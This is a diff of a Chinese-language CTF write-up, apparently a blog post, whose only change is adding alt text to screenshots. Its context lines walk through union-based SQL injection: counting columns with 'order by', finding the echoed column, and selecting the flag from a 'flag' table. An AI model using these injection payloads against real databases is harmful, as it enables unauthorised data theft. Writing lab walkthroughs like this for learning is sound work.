@@ -29,18 +29,18 @@ tags:
 
 第二步：判断字段数
 输入：1 order by 2
-![](/img/7.png)
+![二](/img/7.png)
 
 
 把输入框改成：1 order by 3
-![](/img/4.png)
+![三](/img/4.png)
   
 
 
 第三步：获取回显位
 所以判断出字段数是 2，输入
 -1 union select 1,2
-![](/img/6.png)
+![四](/img/6.png)
 
 
 
@@ -50,5 +50,5 @@ tags:
 
 第五步：拿到 Flag
 改成-1 union select 1,flag from flag
-![](/img/8.png)
+![五](/img/8.png)
 
